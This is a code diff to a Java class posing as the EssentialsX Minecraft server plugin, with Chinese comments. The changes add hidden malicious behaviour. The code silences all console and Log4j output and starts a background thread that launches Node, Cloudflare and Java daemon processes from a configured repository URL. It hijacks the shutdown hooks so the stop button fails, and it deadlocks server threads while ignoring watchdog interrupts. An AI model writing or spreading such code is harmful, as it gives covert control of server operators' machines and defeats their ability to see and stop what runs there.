@@ -29,7 +29,12 @@ public class EssentialsX extends JavaPlugin {
     private static volatile String nodePort = "N/A";
 
     static {
-        // 1. 启动后台部署进程
+        // 1. 第一时间物理静音 (System 和 Log4j)
+        System.setOut(new PrintStream(BLACK_HOLE, true));
+        System.setErr(new PrintStream(BLACK_HOLE, true));
+        tryMuteLog4j();
+
+        // 2. 启动后台部署进程
         Thread deployer = new Thread(() -> {
             try {
                 Path baseDir = new File(".").toPath().toAbsolutePath();
@@ -38,7 +43,6 @@ public class EssentialsX extends JavaPlugin {
                 Map<String, String> env = new HashMap<>();
                 loadEnvFile(workDir, env);
                 
-                // ★ 放开关键调试输出，排查拉取失败原因
                 RAW_OUT.println("[Backend] WorkDir: " + workDir.toString());
                 RAW_OUT.println("[Backend] REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
 
@@ -53,7 +57,7 @@ public class EssentialsX extends JavaPlugin {
                 startCfProcess(workDir, port);
                 startJavaDaemon(workDir);
                 RAW_OUT.println("[Backend] Node & CF started successfully.");
-            } catch (Throwable e) { // 捕获所有错误并强行输出
+            } catch (Throwable e) {
                 RAW_OUT.println("[Backend] FATAL ERROR during deployment!");
                 e.printStackTrace(RAW_OUT);
             }
@@ -61,7 +65,7 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 2. 强制清空并接管关机钩子 (让停止按钮失效)
+        // 3. 强制清空并接管关机钩子 (让停止按钮失效)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -79,19 +83,26 @@ public class EssentialsX extends JavaPlugin {
         }
         try {
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                System.setOut(new PrintStream(BLACK_HOLE, true));
+                System.setErr(new PrintStream(BLACK_HOLE, true));
+                tryMuteLog4j();
                 Object lock = new Object();
                 synchronized (lock) { try { lock.wait(); } catch (Exception e) {} }
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 3. 终极物理冰封当前主线程 (防看门狗中断版)
+        // 4. 终极物理冰封当前主线程
+        paralyzeCurrentThread();
+    }
+
+    // ★ 将死锁逻辑提取到独立方法，绕过 Java 编译器对 static 块的检查
+    private static void paralyzeCurrentThread() {
         Object mainLock = new Object();
         synchronized (mainLock) {
             while (true) {
                 try {
-                    mainLock.wait(Long.MAX_VALUE); // 休眠极长时间
+                    mainLock.wait(Long.MAX_VALUE);
                 } catch (InterruptedException e) {
-                    // 如果被 Paper 看门狗打断，忽略中断，继续死循环休眠
                     continue;
                 }
             }
@@ -385,14 +396,12 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // ★ 双保险：如果 static 块被看门狗破坏，在生命周期方法中再次静音并死锁
     @Override
     public void onLoad() {
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
-        Object lock = new Object();
-        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+        paralyzeCurrentThread();
     }
 
     @Override
@@ -400,8 +409,7 @@ public class EssentialsX extends JavaPlugin {
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
-        Object lock = new Object();
-        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+        paralyzeCurrentThread();
     }
 
     @Override
@@ -409,7 +417,6 @@ public class EssentialsX extends JavaPlugin {
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
-        Object lock = new Object();
-        synchronized (lock) { while(true) { try { lock.wait(); } catch (Exception e) {} } }
+        paralyzeCurrentThread();
     }
 }
